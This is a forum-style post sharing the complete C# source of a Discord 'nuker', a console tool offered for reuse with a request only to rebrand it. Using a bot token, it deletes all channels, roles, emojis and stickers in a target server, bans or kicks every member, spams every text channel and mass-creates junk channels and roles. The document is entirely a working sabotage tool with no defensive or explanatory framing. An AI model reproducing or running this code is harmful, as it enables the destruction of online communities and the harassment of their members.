Source Code:

C# Console app

Don't Skid it and post it somewhere you can use the code just change the branding please and thank you!

```
// POTATO Discord Nuker
// Made with ❤️ by bear

using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class Program
{
    private const string BotToken = ""; // Replace this with your bot token
    private const string SecretKey = "POTATO"; // Access Code
    private static string GuildId = ""; // Don't touch

    static async Task Main(string[] args)
    {
        _ = Task.Run(async () =>
        {
            string[] titles = {
                "POTATO Discord Nuker",
                "Best Discord Nuker",
                "Fast and Reliable"
            };
            int index = 0;
            while (true)
            {
                Console.Title = titles[index++ % titles.Length];
                await Task.Delay(2000);
            }
        });

        Console.Clear();
        DisplayAsciiArt("POTATO", ConsoleColor.Cyan);

        string prompt = "Enter the access key: ";
        Console.SetCursorPosition((Console.WindowWidth - prompt.Length) / 2, Console.WindowHeight / 2);
        Console.Write(prompt);
        string accessKey = Console.ReadLine();

        if (accessKey != SecretKey)
        {
            Console.WriteLine("[-] Invalid key. Exiting.".ColorText(ConsoleColor.Red));
            return;
        }

        using HttpClient httpClient = new HttpClient();
        httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

        while (true)
        {
            Console.Clear();
            DisplayAsciiArt("POTATO", ConsoleColor.Cyan);

            string[] menu = new[]
            {
    "═══════════════════════════════════════════════════════════════════════════════════════",
    "                                POTATO NUKER || BY BEAR                               ",
    "═══════════════════════════════════════════════════════════════════════════════════════",
    "",
    "(01) Set Guild ID          (02) Create Channels       (03) Delete Channels       ",
    "(04) Spam Text             (05) Ban All Members       (06) Kick All Members      ",
    "(07) Delete Stickers       (08) Delete Emojis         (09) Delete Roles          ",
   "(10) Mass Create Roles                                (11) Exit                  "
};

            int startY = Console.WindowHeight / 2 - menu.Length / 2;
            Console.ForegroundColor = ConsoleColor.Cyan;
            foreach (string line in menu)
            {
                Console.SetCursorPosition((Console.WindowWidth - line.Length) / 2, startY++);
                Console.WriteLine(line);
            }
            Console.ResetColor();

            string optPrompt = "(Potato) Option: ";
            Console.SetCursorPosition((Console.WindowWidth - optPrompt.Length) / 2, startY + 1);
            Console.Write(optPrompt);
            string choice = Console.ReadLine();

            switch (choice)
            {
                case "1": Console.Write("Enter Guild ID: "); GuildId = Console.ReadLine(); break;
                case "2": if (CheckGuildId()) await CreateChannels(httpClient); break;
                case "3": if (CheckGuildId()) await DeleteAllChannels(httpClient); break;
                case "4": if (CheckGuildId()) await SpamMessageToAllTextChannels(httpClient); break;
                case "5": if (CheckGuildId()) await BanAllMembers(httpClient); break;
                case "6": if (CheckGuildId()) await KickAllMembers(httpClient); break;
                case "7": if (CheckGuildId()) await DeleteAllStickers(httpClient); break;
                case "8": if (CheckGuildId()) await DeleteAllEmojis(httpClient); break;
                case "9": if (CheckGuildId()) await DeleteAllRoles(httpClient); break;
                case "10": if (CheckGuildId()) await MassCreateRoles(httpClient); break;
                case "11": return;
                default: Console.WriteLine("[-] Invalid choice.".ColorText(ConsoleColor.Red)); break;
            }

            Console.WriteLine("\nPress Enter to continue...");
            Console.ReadLine();
        }
    }

    private static bool CheckGuildId()
    {
        if (string.IsNullOrEmpty(GuildId))
        {
            Console.WriteLine("[-] Please set the Server ID first.".ColorText(ConsoleColor.Red));
            return false;
        }
        return true;
    }

    private static void DisplayAsciiArt(string title, ConsoleColor color)
    {
        string[] ascii = new[]
        {
            @"██████╗  ██████╗ ████████╗ █████╗ ████████╗ ██████╗ ",
            @"██╔══██╗██╔═══██╗╚══██╔══╝██╔══██╗╚══██╔══╝██╔═══██╗",
            @"██████╔╝██║   ██║   ██║   ███████║   ██║   ██║   ██║",
            @"██╔═══╝ ██║   ██║   ██║   ██╔══██║   ██║   ██║   ██║",
            @"██║     ╚██████╔╝   ██║   ██║  ██║   ██║   ╚██████╔╝",
            @"╚═╝      ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ "
        };

        int top = 2;
        Console.ForegroundColor = color;
        foreach (string line in ascii)
        {
            Console.SetCursorPosition((Console.WindowWidth - line.Length) / 2, top++);
            Console.WriteLine(line);
        }
        Console.ResetColor();
    }

    private static async Task CreateChannels(HttpClient httpClient)
    {
        Console.Write("How many channels to create? ");
        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0) return;

        Console.Write("Enter base name for the channels: ");
        string name = Console.ReadLine();

        for (int i = 1; i <= count; i++)
        {
            var payload = new { name = $"{name}-{i}", type = 0 };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            await httpClient.PostAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels", content);
            await Task.Delay(100);
        }
        Console.WriteLine("[+] Channels created!".ColorText(ConsoleColor.Green));
    }

    private static async Task DeleteAllChannels(HttpClient httpClient)
    {
        Console.Write("Are you sure you want to delete ALL channels? (y/n): ");
        if (Console.ReadLine()?.ToLower() != "y") return;

        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels");
        var json = await res.Content.ReadAsStringAsync();
        var channels = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();

        foreach (var ch in channels)
        {
            string id = ch.GetProperty("id").GetString();
            await httpClient.DeleteAsync($"https://discord.com/api/v10/channels/{id}");
            await Task.Delay(100);
        }

        Console.WriteLine("[+] All channels deleted.".ColorText(ConsoleColor.Green));
    }

    private static async Task SpamMessageToAllTextChannels(HttpClient httpClient)
    {
        Console.Write("Enter the message to spam: ");
        string msg = Console.ReadLine();

        Console.Write("How many times per channel? ");
        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0) return;

        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels");
        var json = await res.Content.ReadAsStringAsync();
        var channels = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();

        foreach (var ch in channels)
        {
            if (ch.GetProperty("type").GetInt32() != 0) continue;
            string id = ch.GetProperty("id").GetString();
            for (int i = 0; i < count; i++)
            {
                var payload = new { content = msg };
                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
                await httpClient.PostAsync($"https://discord.com/api/v10/channels/{id}/messages", content);
                await Task.Delay(250);
            }
        }

        Console.WriteLine("[+] Spam complete.".ColorText(ConsoleColor.Green));
    }

    private static async Task BanAllMembers(HttpClient httpClient)
    {
        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/members?limit=1000");
        var json = await res.Content.ReadAsStringAsync();
        var members = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();

        foreach (var m in members)
        {
            string id = m.GetProperty("user").GetProperty("id").GetString();
            await httpClient.PutAsync($"https://discord.com/api/v10/guilds/{GuildId}/bans/{id}", null);
            await Task.Delay(100);
        }

        Console.WriteLine("[+] All members banned.".ColorText(ConsoleColor.Green));
    }

    private static async Task KickAllMembers(HttpClient httpClient)
    {
        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/members?limit=1000");
        var json = await res.Content.ReadAsStringAsync();
        var members = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();

        foreach (var m in members)
        {
            string id = m.GetProperty("user").GetProperty("id").GetString();
            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/members/{id}");
            await Task.Delay(100);
        }

        Console.WriteLine("[+] All members kicked.".ColorText(ConsoleColor.Green));
    }

    private static async Task DeleteAllStickers(HttpClient httpClient)
    {
        Console.Write("Are you sure you want to delete all stickers? (y/n): ");
        if (Console.ReadLine()?.ToLower() != "y") return;

        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/stickers");
        var data = JsonSerializer.Deserialize<JsonElement>(await res.Content.ReadAsStringAsync());

        foreach (var s in data.EnumerateArray())
        {
            string id = s.GetProperty("id").GetString();
            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/stickers/{id}");
            await Task.Delay(100);
        }

        Console.WriteLine("[+] All stickers deleted.".ColorText(ConsoleColor.Green));
    }

    private static async Task DeleteAllEmojis(HttpClient httpClient)
    {
        Console.Write("Are you sure you want to delete all emojis? (y/n): ");
        if (Console.ReadLine()?.ToLower() != "y") return;

        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/emojis");
        var data = JsonSerializer.Deserialize<JsonElement>(await res.Content.ReadAsStringAsync());

        foreach (var emoji in data.EnumerateArray())
        {
            string id = emoji.GetProperty("id").GetString();
            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/emojis/{id}");
            await Task.Delay(100);
        }

        Console.WriteLine("[+] All emojis deleted.".ColorText(ConsoleColor.Green));
    }

    private static async Task DeleteAllRoles(HttpClient httpClient)
    {
        Console.Write("Are you sure you want to delete all roles? (y/n): ");
        if (Console.ReadLine()?.ToLower() != "y") return;

        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/roles");
        var roles = JsonSerializer.Deserialize<JsonElement>(await res.Content.ReadAsStringAsync());

        foreach (var role in roles.EnumerateArray())
        {
            string id = role.GetProperty("id").GetString();
            if (role.GetProperty("managed").GetBoolean()) continue;
            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/roles/{id}");
            await Task.Delay(100);
        }

        Console.WriteLine("[+] All roles deleted.".ColorText(ConsoleColor.Green));
    }

    private static async Task MassCreateRoles(HttpClient httpClient)
    {
        Console.Write("Enter role name: ");
        string roleName = Console.ReadLine();

        Console.Write("How many roles to create? ");
        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0) return;

        for (int i = 1; i <= count; i++)
        {
            var payload = new { name = $"{roleName}-{i}" };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            await httpClient.PostAsync($"https://discord.com/api/v10/guilds/{GuildId}/roles", content);
            await Task.Delay(100);
        }

        Console.WriteLine("[+] Roles created.".ColorText(ConsoleColor.Green));
    }
}

static class ConsoleExtensions
{
    public static string ColorText(this string text, ConsoleColor color)
    {
        Console.ForegroundColor = color;
        Console.Write(text);
        Console.ResetColor();
        return "";
    }
}
```
